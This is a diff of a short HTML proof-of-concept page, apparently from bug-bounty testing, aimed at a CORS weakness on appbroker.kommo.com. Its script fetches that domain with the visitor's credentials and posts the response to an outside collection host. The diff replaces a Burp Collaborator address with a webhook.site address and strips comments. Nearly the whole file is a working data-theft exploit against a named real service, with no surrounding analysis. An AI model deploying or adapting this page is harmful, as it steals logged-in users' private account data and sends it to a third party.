@@ -1,28 +1,23 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Kommo CORS PoC</title>
-  </head>
+  <head><title>CORS PoC</title></head>
   <body>
-    <h1>Testing CORS exploit...</h1>
+    <h1>CORS PoC - appbroker.kommo.com</h1>
     <script>
-      // Step 1: Make a credentialed request to the vulnerable domain
       fetch("https://appbroker.kommo.com", {
         credentials: "include"
       })
       .then(res => res.text())
       .then(data => {
-        console.log("[+] Response from appbroker:", data);
-        
-        // Step 2: Send it to your Burp Collaborator using no-cors
-        fetch("https://au8y9q2k4ga29sx7iks6iu311s7kvij7.oastify.com", {
+        console.log("Response:", data);
+        fetch("https://webhook.site/08b7ddee-7f30-4294-bcde-c34c778e5e26", {
           method: "POST",
-          mode: "no-cors",
-          body: data
+          body: data,
+          mode: "no-cors"
         });
       })
       .catch(err => {
-        console.error("[!] Fetch failed:", err);
+        console.error("Error:", err);
       });
     </script>
   </body>
